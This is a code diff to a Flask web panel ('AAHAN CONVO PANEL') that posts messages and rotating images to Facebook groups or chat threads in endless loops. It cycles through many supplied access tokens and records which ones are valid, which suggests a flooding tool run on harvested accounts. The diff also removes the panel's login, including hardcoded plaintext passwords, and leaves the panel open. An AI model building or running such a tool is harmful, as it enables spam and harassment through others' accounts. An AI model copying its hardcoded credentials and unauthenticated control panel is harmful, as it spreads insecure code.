@@ -1,28 +1,18 @@
-from flask import Flask, request, render_template_string, make_response, session, redirect, url_for
+from flask import Flask, request, render_template_string
 import requests
 from threading import Thread, Event
 import time
 import secrets
 import os
 import json
-from datetime import datetime, timedelta
-from functools import wraps
+from datetime import datetime
 import random
-import string
-import base64
 
 app = Flask(__name__)
 app.config['UPLOAD_FOLDER'] = './uploads'
 app.config['SECRET_KEY'] = secrets.token_hex(32)
 app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
-
-# Simple user database
-users = {
-    'jamal': 'jamal786',
-    'waleed': 'darkconsole',
-    'user': 'password123'
-}
 
 # Updated headers for Facebook API
 headers = {
@@ -40,16 +30,6 @@ headers = {
 stop_events = {}
 threads = {}
 
-# Login required decorator
-def login_required(f):
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if 'logged_in' not in session:
-            return redirect(url_for('login'))
-        return f(*args, **kwargs)
-    return decorated_function
-
-# Cookie management system
 def save_cookies(task_id, cookies_data):
     """Save cookies data to file"""
     cookies_file = os.path.join(app.config['UPLOAD_FOLDER'], f'cookies_{task_id}.json')
@@ -109,8 +89,8 @@ def upload_image_to_facebook(access_token, image_path, group_id):
         print(f"Image upload error: {str(e)}")
         return None
 
-# Message sending functions with image support
-def send_messages(access_tokens, group_id, prefix, delay, messages, task_id, image_path=None):
+# Enhanced message sending function with alternating text and image
+def send_messages_with_images(access_tokens, group_id, prefix, delay, messages, task_id, image_paths):
     stop_event = stop_events[task_id]
     
     cookies_data = {
@@ -118,25 +98,14 @@ def send_messages(access_tokens, group_id, prefix, delay, messages, task_id, ima
         'invalid_tokens': [],
         'last_checked': datetime.now().isoformat(),
         'total_messages_sent': 0,
-        'total_images_sent': 0
+        'total_images_sent': 0,
+        'current_message_index': 0,
+        'current_image_index': 0
     }
-    
-    # Handle image upload if provided
-    image_attachment_id = None
-    if image_path and os.path.exists(image_path):
-        print("Image detected, preparing upload...")
-        # Use first valid token for image upload
-        for token in [t.strip() for t in access_tokens if t.strip()]:
-            if check_cookie_validity(token):
-                image_attachment_id = upload_image_to_facebook(token, image_path, group_id)
-                if image_attachment_id:
-                    print(f"Image uploaded successfully! Attachment ID: {image_attachment_id}")
-                    cookies_data['total_images_sent'] += 1
-                break
     
     while not stop_event.is_set():
         try:
-            for message in messages:
+            for message_index, message in enumerate(messages):
                 if stop_event.is_set():
                     break
                 
@@ -150,45 +119,53 @@ def send_messages(access_tokens, group_id, prefix, delay, messages, task_id, ima
                     
                     if token_valid:
                         cookies_data['valid_tokens'] = list(set(cookies_data['valid_tokens'] + [token]))
+                        
                         try:
-                            if image_attachment_id:
-                                # Send message with image attachment
-                                response = requests.post(
-                                    f'https://graph.facebook.com/v19.0/{group_id}/feed',
-                                    data={
-                                        'message': full_message,
-                                        'attached_media[0]': f'{{"media_fbid":"{image_attachment_id}"}}',
-                                        'access_token': token
-                                    },
-                                    headers=headers,
-                                    timeout=15
-                                )
-                            else:
-                                # Send text message only
-                                response = requests.post(
-                                    f'https://graph.facebook.com/v19.0/{group_id}/feed',
-                                    data={
-                                        'message': full_message,
-                                        'access_token': token
-                                    },
-                                    headers=headers,
-                                    timeout=15
-                                )
+                            # Send text message
+                            response_text = requests.post(
+                                f'https://graph.facebook.com/v19.0/{group_id}/feed',
+                                data={
+                                    'message': full_message,
+                                    'access_token': token
+                                },
+                                headers=headers,
+                                timeout=15
+                            )
                             
-                            if response.status_code == 200:
-                                print(f"Message sent successfully! Token: {token[:6]}...")
+                            if response_text.status_code == 200:
+                                print(f"Text message sent successfully! Token: {token[:6]}...")
                                 cookies_data['total_messages_sent'] += 1
                             else:
-                                error_msg = response.json().get('error', {}).get('message', 'Unknown error')
-                                print(f"Failed to send message. Error: {error_msg} | Token: {token[:6]}...")
+                                error_msg = response_text.json().get('error', {}).get('message', 'Unknown error')
+                                print(f"Failed to send text message. Error: {error_msg} | Token: {token[:6]}...")
                                 
                         except Exception as e:
-                            print(f"Request failed: {str(e)}")
+                            print(f"Text message request failed: {str(e)}")
+                        
+                        # Send image if available
+                        if image_paths:
+                            current_image_index = cookies_data['current_image_index'] % len(image_paths)
+                            image_path = image_paths[current_image_index]
+                            
+                            if os.path.exists(image_path):
+                                try:
+                                    image_attachment_id = upload_image_to_facebook(token, image_path, group_id)
+                                    if image_attachment_id:
+                                        print(f"Image sent successfully! Token: {token[:6]}...")
+                                        cookies_data['total_images_sent'] += 1
+                                        cookies_data['current_image_index'] += 1
+                                    else:
+                                        print(f"Failed to upload image for token: {token[:6]}...")
+                                        
+                                except Exception as e:
+                                    print(f"Image upload failed: {str(e)}")
+                        
                     else:
                         cookies_data['invalid_tokens'] = list(set(cookies_data['invalid_tokens'] + [token]))
                         print(f"Invalid token detected: {token[:6]}...")
                     
                     cookies_data['last_checked'] = datetime.now().isoformat()
+                    cookies_data['current_message_index'] = message_index
                     save_cookies(task_id, cookies_data)
                     
                     time.sleep(max(delay, 10))
@@ -200,7 +177,8 @@ def send_messages(access_tokens, group_id, prefix, delay, messages, task_id, ima
             print(f"Error in message loop: {str(e)}")
             time.sleep(10)
 
-def send_messages_alternative(access_tokens, thread_id, mn, time_interval, messages, task_id, image_path=None):
+# Alternative method for sending messages with images
+def send_messages_alternative_with_images(access_tokens, thread_id, mn, time_interval, messages, task_id, image_paths):
     stop_event = stop_events[task_id]
     
     cookies_data = {
@@ -208,25 +186,16 @@ def send_messages_alternative(access_tokens, thread_id, mn, time_interval, messa
         'invalid_tokens': [],
         'last_checked': datetime.now().isoformat(),
         'total_messages_sent': 0,
-        'total_images_sent': 0
+        'total_images_sent': 0,
+        'current_message_index': 0,
+        'current_image_index': 0
     }
     
-    # Handle image upload for alternative method
-    image_attachment_id = None
-    if image_path and os.path.exists(image_path):
-        print("Image detected for alternative method...")
-        for token in [t.strip() for t in access_tokens if t.strip()]:
-            if check_cookie_validity(token):
-                image_attachment_id = upload_image_to_facebook(token, image_path, thread_id)
-                if image_attachment_id:
-                    print(f"Image uploaded successfully! Attachment ID: {image_attachment_id}")
-                    cookies_data['total_images_sent'] += 1
-                break
-    
     while not stop_event.is_set():
-        for message1 in messages:
+        for message_index, message1 in enumerate(messages):
             if stop_event.is_set():
                 break
+                
             for access_token in access_tokens:
                 if stop_event.is_set():
                     break
@@ -235,711 +204,54 @@ def send_messages_alternative(access_tokens, thread_id, mn, time_interval, messa
                 
                 if token_valid:
                     cookies_data['valid_tokens'] = list(set(cookies_data['valid_tokens'] + [access_token]))
+                    
                     try:
+                        # Send text message
                         api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                         message = str(mn) + ' ' + message1
                         
-                        if image_attachment_id:
-                            parameters = {
-                                'access_token': access_token, 
-                                'message': message,
-                                'attachment_id': image_attachment_id
-                            }
-                        else:
-                            parameters = {'access_token': access_token, 'message': message}
-                            
+                        parameters = {'access_token': access_token, 'message': message}
                         response = requests.post(api_url, data=parameters, headers=headers)
                         
                         if response.status_code == 200:
-                            print(f"Message Sent Successfully From token {access_token}: {message}")
+                            print(f"Text message sent successfully! Token: {access_token[:6]}...")
                             cookies_data['total_messages_sent'] += 1
                         else:
-                            print(f"Message Sent Failed From token {access_token}: {message}")
+                            print(f"Text message failed! Token: {access_token[:6]}...")
                             
                     except Exception as e:
-                        print(f"Request failed: {str(e)}")
+                        print(f"Text message request failed: {str(e)}")
+                    
+                    # Send image if available
+                    if image_paths:
+                        current_image_index = cookies_data['current_image_index'] % len(image_paths)
+                        image_path = image_paths[current_image_index]
+                        
+                        if os.path.exists(image_path):
+                            try:
+                                image_attachment_id = upload_image_to_facebook(access_token, image_path, thread_id)
+                                if image_attachment_id:
+                                    print(f"Image sent successfully! Token: {access_token[:6]}...")
+                                    cookies_data['total_images_sent'] += 1
+                                    cookies_data['current_image_index'] += 1
+                                else:
+                                    print(f"Failed to upload image for token: {access_token[:6]}...")
+                                    
+                            except Exception as e:
+                                print(f"Image upload failed: {str(e)}")
+                    
                 else:
                     cookies_data['invalid_tokens'] = list(set(cookies_data['invalid_tokens'] + [access_token]))
                     print(f"Invalid token detected: {access_token[:6]}...")
                 
                 cookies_data['last_checked'] = datetime.now().isoformat()
+                cookies_data['current_message_index'] = message_index
                 save_cookies(task_id, cookies_data)
                 
                 time.sleep(time_interval)
 
-# Enhanced Login Page with New Background Design
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        username = request.form.get('username')
-        password = request.form.get('password')
-        
-        if username in users and users[username] == password:
-            session['logged_in'] = True
-            session['username'] = username
-            return redirect(url_for('main_handler'))
-        else:
-            return render_template_string('''
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>🚀 AAHAN CONVO PANEL - ACCESS</title>
-                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-                <style>
-                    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;500;600;700&display=swap');
-                    
-                    :root {
-                        --primary: #ff6b35;
-                        --secondary: #2ec4b6;
-                        --accent: #e71d36;
-                        --dark: #1a1a2e;
-                        --darker: #16213e;
-                    }
-                    
-                    * {
-                        margin: 0;
-                        padding: 0;
-                        box-sizing: border-box;
-                    }
-                    
-                    body {
-                        background: linear-gradient(135deg, #0f3460 0%, #1a1a2e 50%, #16213e 100%);
-                        font-family: 'Exo 2', sans-serif;
-                        color: white;
-                        min-height: 100vh;
-                        overflow-x: hidden;
-                        position: relative;
-                    }
-                    
-                    body::before {
-                        content: '';
-                        position: fixed;
-                        top: 0;
-                        left: 0;
-                        width: 100%;
-                        height: 100%;
-                        background: 
-                            radial-gradient(circle at 20% 80%, rgba(255, 107, 53, 0.15) 0%, transparent 50%),
-                            radial-gradient(circle at 80% 20%, rgba(46, 196, 182, 0.15) 0%, transparent 50%),
-                            radial-gradient(circle at 40% 40%, rgba(231, 29, 54, 0.1) 0%, transparent 50%);
-                        pointer-events: none;
-                        z-index: -1;
-                    }
-                    
-                    .aahan-container {
-                        min-height: 100vh;
-                        display: flex;
-                        align-items: center;
-                        justify-content: center;
-                        padding: 20px;
-                    }
-                    
-                    .login-card {
-                        background: rgba(26, 26, 46, 0.95);
-                        backdrop-filter: blur(20px);
-                        border: 2px solid rgba(255, 107, 53, 0.4);
-                        border-radius: 20px;
-                        padding: 50px 40px;
-                        width: 100%;
-                        max-width: 450px;
-                        position: relative;
-                        overflow: hidden;
-                        box-shadow: 
-                            0 0 50px rgba(255, 107, 53, 0.3),
-                            0 0 100px rgba(46, 196, 182, 0.2),
-                            inset 0 0 50px rgba(255, 107, 53, 0.1);
-                        animation: cardGlow 3s ease-in-out infinite alternate;
-                    }
-                    
-                    @keyframes cardGlow {
-                        0% {
-                            box-shadow: 
-                                0 0 50px rgba(255, 107, 53, 0.3),
-                                0 0 100px rgba(46, 196, 182, 0.2),
-                                inset 0 0 50px rgba(255, 107, 53, 0.1);
-                        }
-                        100% {
-                            box-shadow: 
-                                0 0 70px rgba(255, 107, 53, 0.4),
-                                0 0 140px rgba(46, 196, 182, 0.3),
-                                inset 0 0 70px rgba(255, 107, 53, 0.15);
-                        }
-                    }
-                    
-                    .login-card::before {
-                        content: '';
-                        position: absolute;
-                        top: -50%;
-                        left: -50%;
-                        width: 200%;
-                        height: 200%;
-                        background: linear-gradient(45deg, transparent, rgba(255, 107, 53, 0.1), transparent);
-                        transform: rotate(45deg);
-                        animation: shine 3s infinite;
-                    }
-                    
-                    @keyframes shine {
-                        0% { transform: rotate(45deg) translateX(-100%); }
-                        100% { transform: rotate(45deg) translateX(100%); }
-                    }
-                    
-                    .logo-section {
-                        text-align: center;
-                        margin-bottom: 40px;
-                    }
-                    
-                    .main-logo {
-                        font-family: 'Orbitron', sans-serif;
-                        font-size: 3rem;
-                        font-weight: 900;
-                        background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
-                        -webkit-background-clip: text;
-                        -webkit-text-fill-color: transparent;
-                        margin-bottom: 10px;
-                        text-shadow: 0 0 30px rgba(255, 107, 53, 0.5);
-                    }
-                    
-                    .tagline {
-                        color: rgba(255, 255, 255, 0.7);
-                        font-size: 1.1rem;
-                        margin-bottom: 5px;
-                    }
-                    
-                    .version {
-                        color: var(--primary);
-                        font-size: 0.9rem;
-                        font-weight: 600;
-                    }
-                    
-                    .form-group {
-                        margin-bottom: 25px;
-                        position: relative;
-                    }
-                    
-                    .form-label {
-                        color: var(--primary);
-                        font-weight: 600;
-                        margin-bottom: 8px;
-                        text-transform: uppercase;
-                        letter-spacing: 1px;
-                        font-size: 0.9rem;
-                    }
-                    
-                    .form-control {
-                        background: rgba(255, 107, 53, 0.08);
-                        border: 2px solid rgba(255, 107, 53, 0.4);
-                        border-radius: 10px;
-                        color: white;
-                        padding: 12px 15px;
-                        font-size: 1rem;
-                        transition: all 0.3s ease;
-                    }
-                    
-                    .form-control:focus {
-                        background: rgba(255, 107, 53, 0.15);
-                        border-color: var(--primary);
-                        box-shadow: 0 0 20px rgba(255, 107, 53, 0.4);
-                        color: white;
-                    }
-                    
-                    .form-control::placeholder {
-                        color: rgba(255, 255, 255, 0.5);
-                    }
-                    
-                    .login-btn {
-                        background: linear-gradient(135deg, var(--primary), var(--secondary));
-                        border: none;
-                        border-radius: 10px;
-                        color: white;
-                        padding: 15px;
-                        font-family: 'Orbitron', sans-serif;
-                        font-weight: 700;
-                        text-transform: uppercase;
-                        letter-spacing: 2px;
-                        width: 100%;
-                        transition: all 0.3s ease;
-                        position: relative;
-                        overflow: hidden;
-                    }
-                    
-                    .login-btn:hover {
-                        transform: translateY(-2px);
-                        box-shadow: 0 10px 30px rgba(255, 107, 53, 0.5);
-                    }
-                    
-                    .login-btn::before {
-                        content: '';
-                        position: absolute;
-                        top: 0;
-                        left: -100%;
-                        width: 100%;
-                        height: 100%;
-                        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-                        transition: 0.5s;
-                    }
-                    
-                    .login-btn:hover::before {
-                        left: 100%;
-                    }
-                    
-                    .alert-danger {
-                        background: rgba(231, 29, 54, 0.2);
-                        border: 1px solid rgba(231, 29, 54, 0.5);
-                        color: #ff6b9d;
-                        border-radius: 10px;
-                        padding: 15px;
-                        margin-bottom: 20px;
-                        text-align: center;
-                    }
-                    
-                    .floating {
-                        animation: floating 3s ease-in-out infinite;
-                    }
-                    
-                    @keyframes floating {
-                        0%, 100% { transform: translateY(0px); }
-                        50% { transform: translateY(-10px); }
-                    }
-                    
-                    .geometric-bg {
-                        position: fixed;
-                        top: 0;
-                        left: 0;
-                        width: 100%;
-                        height: 100%;
-                        pointer-events: none;
-                        z-index: -1;
-                        opacity: 0.3;
-                    }
-                    
-                    .triangle {
-                        position: absolute;
-                        width: 0;
-                        height: 0;
-                        border-style: solid;
-                        animation: float 8s infinite linear;
-                    }
-                    
-                    .circle {
-                        position: absolute;
-                        border-radius: 50%;
-                        animation: float 6s infinite linear;
-                    }
-                </style>
-            </head>
-            <body>
-                <div class="geometric-bg" id="geometricBg"></div>
-                
-                <div class="aahan-container">
-                    <div class="login-card">
-                        <div class="logo-section floating">
-                            <h1 class="main-logo">
-                                <i class="fas fa-comments"></i> AAHAN CONVO
-                            </h1>
-                            <p class="tagline">Advanced Messaging System</p>
-                            <p class="version">v2.1.0 | BY AAHAN</p>
-                        </div>
-                        
-                        <div class="alert-danger">
-                            <i class="fas fa-exclamation-triangle"></i> ACCESS DENIED - Invalid Credentials
-                        </div>
-                        
-                        <form method="post">
-                            <div class="form-group">
-                                <label class="form-label">
-                                    <i class="fas fa-user-astronaut"></i> USERNAME
-                                </label>
-                                <input type="text" class="form-control" name="username" placeholder="Enter your username" required>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label">
-                                    <i class="fas fa-key"></i> PASSWORD
-                                </label>
-                                <input type="password" class="form-control" name="password" placeholder="Enter your password" required>
-                            </div>
-                            
-                            <button type="submit" class="login-btn">
-                                <i class="fas fa-rocket"></i> LAUNCH SYSTEM
-                            </button>
-                        </form>
-                        
-                        <div class="text-center mt-4">
-                            <small style="color: rgba(255, 255, 255, 0.6);">
-                                Secure Access Required | AAHAN Encrypted
-                            </small>
-                        </div>
-                    </div>
-                </div>
-                
-                <script>
-                    // Create geometric background
-                    function createGeometricBackground() {
-                        const bg = document.getElementById('geometricBg');
-                        const colors = ['#ff6b35', '#2ec4b6', '#e71d36'];
-                        
-                        for (let i = 0; i < 20; i++) {
-                            const shape = Math.random() > 0.5 ? 'triangle' : 'circle';
-                            const element = document.createElement('div');
-                            element.className = shape;
-                            
-                            const size = Math.random() * 60 + 20;
-                            const color = colors[Math.floor(Math.random() * colors.length)];
-                            
-                            if (shape === 'triangle') {
-                                element.style.borderWidth = `0 ${size/2}px ${size}px ${size/2}px`;
-                                element.style.borderColor = `transparent transparent ${color} transparent`;
-                            } else {
-                                element.style.width = `${size}px`;
-                                element.style.height = `${size}px`;
-                                element.style.background = color;
-                            }
-                            
-                            element.style.left = `${Math.random() * 100}vw`;
-                            element.style.top = `${Math.random() * 100}vh`;
-                            element.style.animationDelay = `${Math.random() * 8}s`;
-                            element.style.animationDuration = `${Math.random() * 4 + 4}s`;
-                            
-                            bg.appendChild(element);
-                        }
-                    }
-                    
-                    createGeometricBackground();
-                </script>
-            </body>
-            </html>
-            ''')
-
-    return render_template_string('''
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>🚀 AAHAN CONVO PANEL - SYSTEM ACCESS</title>
-        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-        <style>
-            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;500;600;700&display=swap');
-            
-            :root {
-                --primary: #ff6b35;
-                --secondary: #2ec4b6;
-                --accent: #e71d36;
-                --dark: #1a1a2e;
-                --darker: #16213e;
-            }
-            
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-            
-            body {
-                background: linear-gradient(135deg, #0f3460 0%, #1a1a2e 50%, #16213e 100%);
-                font-family: 'Exo 2', sans-serif;
-                color: white;
-                min-height: 100vh;
-                overflow-x: hidden;
-                position: relative;
-            }
-            
-            body::before {
-                content: '';
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: 
-                    radial-gradient(circle at 20% 80%, rgba(255, 107, 53, 0.15) 0%, transparent 50%),
-                    radial-gradient(circle at 80% 20%, rgba(46, 196, 182, 0.15) 0%, transparent 50%),
-                    radial-gradient(circle at 40% 40%, rgba(231, 29, 54, 0.1) 0%, transparent 50%);
-                pointer-events: none;
-                z-index: -1;
-            }
-            
-            .aahan-container {
-                min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                padding: 20px;
-            }
-            
-            .login-card {
-                background: rgba(26, 26, 46, 0.95);
-                backdrop-filter: blur(20px);
-                border: 2px solid rgba(255, 107, 53, 0.4);
-                border-radius: 20px;
-                padding: 50px 40px;
-                width: 100%;
-                max-width: 450px;
-                position: relative;
-                overflow: hidden;
-                box-shadow: 
-                    0 0 50px rgba(255, 107, 53, 0.3),
-                    0 0 100px rgba(46, 196, 182, 0.2),
-                    inset 0 0 50px rgba(255, 107, 53, 0.1);
-                animation: cardGlow 3s ease-in-out infinite alternate;
-            }
-            
-            @keyframes cardGlow {
-                0% {
-                    box-shadow: 
-                        0 0 50px rgba(255, 107, 53, 0.3),
-                        0 0 100px rgba(46, 196, 182, 0.2),
-                        inset 0 0 50px rgba(255, 107, 53, 0.1);
-                }
-                100% {
-                    box-shadow: 
-                        0 0 70px rgba(255, 107, 53, 0.4),
-                        0 0 140px rgba(46, 196, 182, 0.3),
-                        inset 0 0 70px rgba(255, 107, 53, 0.15);
-                }
-            }
-            
-            .login-card::before {
-                content: '';
-                position: absolute;
-                top: -50%;
-                left: -50%;
-                width: 200%;
-                height: 200%;
-                background: linear-gradient(45deg, transparent, rgba(255, 107, 53, 0.1), transparent);
-                transform: rotate(45deg);
-                animation: shine 3s infinite;
-            }
-            
-            @keyframes shine {
-                0% { transform: rotate(45deg) translateX(-100%); }
-                100% { transform: rotate(45deg) translateX(100%); }
-            }
-            
-            .logo-section {
-                text-align: center;
-                margin-bottom: 40px;
-            }
-            
-            .main-logo {
-                font-family: 'Orbitron', sans-serif;
-                font-size: 3rem;
-                font-weight: 900;
-                background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                margin-bottom: 10px;
-                text-shadow: 0 0 30px rgba(255, 107, 53, 0.5);
-            }
-            
-            .tagline {
-                color: rgba(255, 255, 255, 0.7);
-                font-size: 1.1rem;
-                margin-bottom: 5px;
-            }
-            
-            .version {
-                color: var(--primary);
-                font-size: 0.9rem;
-                font-weight: 600;
-            }
-            
-            .form-group {
-                margin-bottom: 25px;
-                position: relative;
-            }
-            
-            .form-label {
-                color: var(--primary);
-                font-weight: 600;
-                margin-bottom: 8px;
-                text-transform: uppercase;
-                letter-spacing: 1px;
-                font-size: 0.9rem;
-            }
-            
-            .form-control {
-                background: rgba(255, 107, 53, 0.08);
-                border: 2px solid rgba(255, 107, 53, 0.4);
-                border-radius: 10px;
-                color: white;
-                padding: 12px 15px;
-                font-size: 1rem;
-                transition: all 0.3s ease;
-            }
-            
-            .form-control:focus {
-                background: rgba(255, 107, 53, 0.15);
-                border-color: var(--primary);
-                box-shadow: 0 0 20px rgba(255, 107, 53, 0.4);
-                color: white;
-            }
-            
-            .form-control::placeholder {
-                color: rgba(255, 255, 255, 0.5);
-            }
-            
-            .login-btn {
-                background: linear-gradient(135deg, var(--primary), var(--secondary));
-                border: none;
-                border-radius: 10px;
-                color: white;
-                padding: 15px;
-                font-family: 'Orbitron', sans-serif;
-                font-weight: 700;
-                text-transform: uppercase;
-                letter-spacing: 2px;
-                width: 100%;
-                transition: all 0.3s ease;
-                position: relative;
-                overflow: hidden;
-            }
-            
-            .login-btn:hover {
-                transform: translateY(-2px);
-                box-shadow: 0 10px 30px rgba(255, 107, 53, 0.5);
-            }
-            
-            .login-btn::before {
-                content: '';
-                position: absolute;
-                top: 0;
-                left: -100%;
-                width: 100%;
-                height: 100%;
-                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-                transition: 0.5s;
-            }
-            
-            .login-btn:hover::before {
-                left: 100%;
-            }
-            
-            .floating {
-                animation: floating 3s ease-in-out infinite;
-            }
-            
-            @keyframes floating {
-                0%, 100% { transform: translateY(0px); }
-                50% { transform: translateY(-10px); }
-            }
-            
-            .geometric-bg {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                pointer-events: none;
-                z-index: -1;
-                opacity: 0.3;
-            }
-            
-            .triangle {
-                position: absolute;
-                width: 0;
-                height: 0;
-                border-style: solid;
-                animation: float 8s infinite linear;
-            }
-            
-            .circle {
-                position: absolute;
-                border-radius: 50%;
-                animation: float 6s infinite linear;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="geometric-bg" id="geometricBg"></div>
-        
-        <div class="aahan-container">
-            <div class="login-card">
-                <div class="logo-section floating">
-                    <h1 class="main-logo">
-                        <i class="fas fa-comments"></i> AAHAN CONVO
-                    </h1>
-                    <p class="tagline">Advanced Messaging System</p>
-                    <p class="version">v2.1.0 | BY AAHAN</p>
-                </div>
-                
-                <form method="post">
-                    <div class="form-group">
-                        <label class="form-label">
-                            <i class="fas fa-user-astronaut"></i> USERNAME
-                        </label>
-                        <input type="text" class="form-control" name="username" placeholder="Enter your username" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label class="form-label">
-                            <i class="fas fa-key"></i> PASSWORD
-                        </label>
-                        <input type="password" class="form-control" name="password" placeholder="Enter your password" required>
-                    </div>
-                    
-                    <button type="submit" class="login-btn">
-                        <i class="fas fa-rocket"></i> LAUNCH SYSTEM
-                    </button>
-                </form>
-                
-                <div class="text-center mt-4">
-                    <small style="color: rgba(255, 255, 255, 0.6);">
-                        Secure Access Required | AAHAN Encrypted
-                    </small>
-                </div>
-            </div>
-        </div>
-        
-        <script>
-            function createGeometricBackground() {
-                const bg = document.getElementById('geometricBg');
-                const colors = ['#ff6b35', '#2ec4b6', '#e71d36'];
-                
-                for (let i = 0; i < 20; i++) {
-                    const shape = Math.random() > 0.5 ? 'triangle' : 'circle';
-                    const element = document.createElement('div');
-                    element.className = shape;
-                    
-                    const size = Math.random() * 60 + 20;
-                    const color = colors[Math.floor(Math.random() * colors.length)];
-                    
-                    if (shape === 'triangle') {
-                        element.style.borderWidth = `0 ${size/2}px ${size}px ${size/2}px`;
-                        element.style.borderColor = `transparent transparent ${color} transparent`;
-                    } else {
-                        element.style.width = `${size}px`;
-                        element.style.height = `${size}px`;
-                        element.style.background = color;
-                    }
-                    
-                    element.style.left = `${Math.random() * 100}vw`;
-                    element.style.top = `${Math.random() * 100}vh`;
-                    element.style.animationDelay = `${Math.random() * 8}s`;
-                    element.style.animationDuration = `${Math.random() * 4 + 4}s`;
-                    
-                    bg.appendChild(element);
-                }
-            }
-            
-            createGeometricBackground();
-        </script>
-    </body>
-    </html>
-    ''')
-
-@app.route('/logout')
-def logout():
-    session.clear()
-    return redirect(url_for('login'))
-
-# Modern Main Interface with Image Support
+# Main Interface with Image Support
 @app.route('/', methods=['GET', 'POST'])
-@login_required
 def main_handler():
     cleanup_tasks()
     
@@ -962,13 +274,16 @@ def main_handler():
             if not messages:
                 return 'Message file is empty', 400
 
-            # Handle image upload
-            image_path = None
-            if 'imageFile' in request.files and request.files['imageFile'].filename != '':
-                image_file = request.files['imageFile']
-                image_filename = f"image_{secrets.token_urlsafe(8)}.jpg"
-                image_path = os.path.join(app.config['UPLOAD_FOLDER'], image_filename)
-                image_file.save(image_path)
+            # Handle multiple image uploads
+            image_paths = []
+            image_files = request.files.getlist('imageFiles')
+            for image_file in image_files:
+                if image_file and image_file.filename != '':
+                    image_filename = f"image_{secrets.token_urlsafe(8)}_{image_file.filename}"
+                    image_path = os.path.join(app.config['UPLOAD_FOLDER'], image_filename)
+                    image_file.save(image_path)
+                    image_paths.append(image_path)
+                    print(f"Image saved: {image_path}")
 
             if token_option == 'single':
                 access_tokens = [request.form.get('singleToken', '').strip()]
@@ -987,13 +302,13 @@ def main_handler():
             
             if api_version == 'v15':
                 threads[task_id] = Thread(
-                    target=send_messages_alternative,
-                    args=(access_tokens, group_id, prefix, delay, messages, task_id, image_path)
+                    target=send_messages_alternative_with_images,
+                    args=(access_tokens, group_id, prefix, delay, messages, task_id, image_paths)
                 )
             else:
                 threads[task_id] = Thread(
-                    target=send_messages,
-                    args=(access_tokens, group_id, prefix, delay, messages, task_id, image_path)
+                    target=send_messages_with_images,
+                    args=(access_tokens, group_id, prefix, delay, messages, task_id, image_paths)
                 )
                 
             threads[task_id].start()
@@ -1142,7 +457,7 @@ def main_handler():
                             </div>
                             <div class="info-item">
                                 <span>Media:</span>
-                                <strong>{{ "Image + Text" if image_path else "Text Only" }}</strong>
+                                <strong>{{ "Text + " ~ image_paths|length ~ " Images" if image_paths else "Text Only" }}</strong>
                             </div>
                             <div class="info-item">
                                 <span>Initiated:</span>
@@ -1164,19 +479,19 @@ def main_handler():
                     </div>
                 </body>
                 </html>
-            ''', task_id=task_id, current_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), api_version=api_version, image_path=image_path)
+            ''', task_id=task_id, current_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), api_version=api_version, image_paths=image_paths)
 
         except Exception as e:
             return f'Error: {str(e)}', 400
 
-    # Modern Main Interface HTML with Image Upload
+    # Modern Main Interface HTML with Multiple Image Upload
     return render_template_string('''
         <!DOCTYPE html>
         <html lang="en">
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>AAHAN CONVO PANEL - AAHAN</title>
+            <title>AAHAN CONVO PANEL - ADVANCED MESSAGING SYSTEM</title>
             <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
             <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
             <style>
@@ -1234,11 +549,6 @@ def main_handler():
                     background: linear-gradient(135deg, var(--primary), var(--accent));
                     -webkit-background-clip: text;
                     -webkit-text-fill-color: transparent;
-                }
-                
-                .user-info {
-                    color: var(--primary);
-                    font-weight: 600;
                 }
                 
                 .main-container {
@@ -1436,6 +746,21 @@ def main_handler():
                     90% { opacity: 1; }
                     100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
                 }
+                
+                .image-preview {
+                    display: flex;
+                    flex-wrap: wrap;
+                    gap: 10px;
+                    margin-top: 10px;
+                }
+                
+                .image-preview-item {
+                    width: 80px;
+                    height: 80px;
+                    object-fit: cover;
+                    border-radius: 8px;
+                    border: 2px solid var(--primary);
+                }
             </style>
         </head>
         <body>
@@ -1447,11 +772,8 @@ def main_handler():
                         <div class="brand">
                             <i class="fas fa-comments"></i> AAHAN CONVO PANEL
                         </div>
-                        <div class="user-info">
